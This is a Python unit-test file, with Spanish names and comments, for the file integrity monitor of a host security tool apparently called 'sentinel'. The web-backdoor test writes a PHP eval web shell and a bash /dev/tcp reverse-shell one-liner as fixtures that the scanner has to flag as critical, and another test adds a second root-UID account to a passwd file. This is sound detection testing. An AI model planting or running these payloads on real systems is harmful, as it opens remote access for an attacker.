import os
import unittest
from unittest import mock

from helpers import Env, core
from sentinel import fim


class FimTests(unittest.TestCase):
    def setUp(self):
        self.e = Env()
        self.f = fim.Fim(self.e.cfg, self.e.alerter, self.e.allow)

    def tearDown(self):
        self.e.close()

    def kinds(self, res):
        return sorted((r["kind"], os.path.basename(r["path"])) for r in res)

    def test_sin_cambios_no_alerta(self):
        self.e.write("a.txt", "hola")
        self.f.init()
        self.assertEqual(self.f.scan(), [])

    def test_detecta_nuevo_modificado_eliminado(self):
        a = self.e.write("a.txt", "uno"); b = self.e.write("b.txt", "dos")
        self.f.init()
        with open(a, "w") as fh: fh.write("cambiado")
        os.remove(b); self.e.write("c.txt", "nuevo")
        self.assertEqual(self.kinds(self.f.scan()), [("added", "c.txt"), ("modified", "a.txt"), ("removed", "b.txt")])

    def test_reemplazo_por_rename_se_detecta(self):
        """El fallo de la versión 1: useradd/vipw reemplazan /etc/passwd con un archivo nuevo renombrado."""
        p = self.e.write("passwd", "root:x:0:0\n")
        self.f.init()
        tmp = p + ".nuevo"
        with open(tmp, "w") as fh: fh.write("root:x:0:0\nmalo:x:0:0\n")
        os.replace(tmp, p)
        self.assertIn(("modified", "passwd"), self.kinds(self.f.scan()))
        with open(p, "a") as fh: fh.write("otro:x:1000\n")                 # y una edición posterior también
        self.assertIn(("modified", "passwd"), self.kinds(self.f.scan()))

    def test_permisos_y_setuid(self):
        p = self.e.write("bin/x", "#!/bin/sh\n", 0o755)
        self.f.init()
        os.chmod(p, 0o4755)
        r = self.f.scan()
        self.assertEqual([(x["kind"], x["sev"]) for x in r], [("setuid", "critical")])
        os.chmod(p, 0o755)
        self.f.accept()
        os.chmod(p, 0o777)
        self.assertEqual([(x["kind"], x["sev"]) for x in self.f.scan()], [("perm", "high")])   # ahora escribible por todos

    def test_enlace_redirigido(self):
        a = self.e.write("a", "1"); b = self.e.write("b", "2")
        l = os.path.join(self.e.tree, "l"); os.symlink(a, l)
        self.f.init(); os.remove(l); os.symlink(b, l)
        self.assertIn(("link", "l"), self.kinds(self.f.scan()))

    def test_exclusiones_y_lista_blanca(self):
        self.f.init()
        self.e.write("app.log", "ruido"); self.e.write(".git/x", "ruido")
        self.assertEqual(self.f.scan(), [])
        self.e.write("ignorar/y", "x")
        self.e.allow.paths = [os.path.join(self.e.tree, "ignorar*")]
        self.assertEqual([r for r in self.f.scan() if "ignorar" in r["path"]], [])

    def test_revision_parcial_solo_mira_esas_rutas(self):
        a = self.e.write("a.txt", "1"); b = self.e.write("b.txt", "2")
        self.f.init()
        with open(a, "w") as fh: fh.write("x")
        with open(b, "w") as fh: fh.write("y")
        r = self.f.scan(paths=[a])
        self.assertEqual(self.kinds(r), [("modified", "a.txt")])

    def test_aceptar_actualiza_la_referencia(self):
        a = self.e.write("a.txt", "1"); self.f.init()
        with open(a, "w") as fh: fh.write("2")
        self.f.accept([a])
        self.assertEqual(self.f.scan(), [])

    def test_puerta_trasera_web(self):
        e = Env(www="__W__")
        try:
            e.cfg.set("fim", "www", e.tree); e.cfg.set("fim", "paths", e.tree)
            f = fim.Fim(e.cfg, e.alerter, e.allow)
            e.write("index.php", "<?php echo 'hola'; ?>")
            f.init()
            e.write("sub/shell.php", "<?php @eval(base64_decode($_POST['x'])); ?>")
            e.write("sub/ok.php", "<?php echo 1; ?>")
            e.write("rev.sh", "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1")
            r = {os.path.basename(x["path"]): x for x in f.scan()}
            self.assertEqual(r["shell.php"]["sev"], "critical"); self.assertIn("puerta trasera", r["shell.php"]["detail"])
            self.assertEqual(r["ok.php"]["sev"], "high")          # ejecutable nuevo sin firma: sospechoso pero no confirmado
            self.assertEqual(r["rev.sh"]["sev"], "critical")
        finally:
            e.close()

    def test_actividad_de_paquetes(self):
        log = os.path.join(self.e.dir, "dpkg.log")
        self.assertFalse(fim.package_activity(300, log))                    # sin registro
        open(log, "w").write("x")
        self.assertTrue(fim.package_activity(300, log))                     # modificado hace instantes
        os.utime(log, (1, 1))
        self.assertFalse(fim.package_activity(300, log))                    # antiguo

    def test_archivos_de_sentinel_son_propios(self):
        for ok in ("/opt/sentinel/sentinel/core.py", "/etc/sentinel/sentinel.conf", "/etc/sentinel/sentinel.conf.dpkg-old", "/usr/bin/sentinel"):
            self.assertTrue(fim.es_de_sentinel(ok), ok)
        for no in ("/opt/sentinelx/a", "/etc/sentinelx", "/etc/passwd", "/usr/bin/sentinel-evil/x" if False else "/etc/ssh/sshd_config"):
            self.assertFalse(fim.es_de_sentinel(no), no)

    def test_carpeta_excluida_no_se_recorre(self):
        self.e.write("node/x", "1")
        os.makedirs(os.path.join(self.e.tree, "app", ".git", "objects"))
        snap = fim.snapshot([self.e.tree], ["*/.git/*"], 1 << 20)
        self.assertFalse([p for p in snap if "/.git" in p])

    def test_sin_referencia_avisa(self):
        self.assertEqual(self.f.scan(), [])
        self.assertIn("sin_referencia", [x["kind"] for x in self.e.events()])
